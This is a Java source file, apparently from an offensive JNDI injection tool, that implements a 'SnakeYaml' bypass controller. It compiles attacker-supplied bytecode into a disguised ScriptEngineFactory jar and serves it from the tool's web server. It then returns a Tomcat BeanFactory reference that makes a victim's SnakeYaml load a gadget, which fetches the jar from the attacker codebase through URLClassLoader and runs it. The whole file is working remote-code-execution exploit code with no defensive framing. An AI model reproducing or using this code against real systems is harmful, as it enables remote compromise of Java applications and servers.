package com.h2tg.ysogate.controller.bypass;

import com.h2tg.ysogate.config.JndiConfig;
import com.h2tg.ysogate.utils.RandomUtils;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import com.h2tg.ysogate.annotation.JNDIController;
import com.h2tg.ysogate.annotation.JNDIMapping;
import com.h2tg.ysogate.controller.BasicController;
import com.h2tg.ysogate.exploit.server.WebServer;
import com.h2tg.ysogate.template.ScriptEngineFactoryTemplate;
import com.h2tg.ysogate.utils.JarUtils;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

import com.h2tg.ysogate.utils.CtClassUtils;

import java.util.Base64;

import static com.h2tg.ysogate.bullet.defineClass.JsConverter.all;

@JNDIController
@JNDIMapping("/SnakeYaml")
public class SnakeYamlController extends BasicController
{
    @Override
    public Object process(Object obj)
    {
        byte[] byteCode = (byte[]) obj;
        System.out.println("[Reference] Factory: BeanFactory + SnakeYaml");

        String factoryClassName = RandomUtils.getRandStr(12);
        String jarName = RandomUtils.getRandStr(12);

        String code = all(Base64.getEncoder().encodeToString(byteCode));

        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"" + JndiConfig.codebase + jarName + ".jar" + "\"]\n" +
                "  ]]\n" +
                "]";

        byte[] jarBytes = null;

        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get(ScriptEngineFactoryTemplate.class.getName());
            clazz.replaceClassName(clazz.getName(), factoryClassName);
            CtClassUtils.setCtField(clazz, "code", CtField.Initializer.constant(code));

            jarBytes = JarUtils.createWithSPI(factoryClassName, clazz.toBytecode(),"javax.script.ScriptEngineFactory");
        } catch (Exception e) {
            e.printStackTrace();
        }

        WebServer.getInstance().serveFile("/" + jarName + ".jar", jarBytes);

        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        return ref;
    }
}
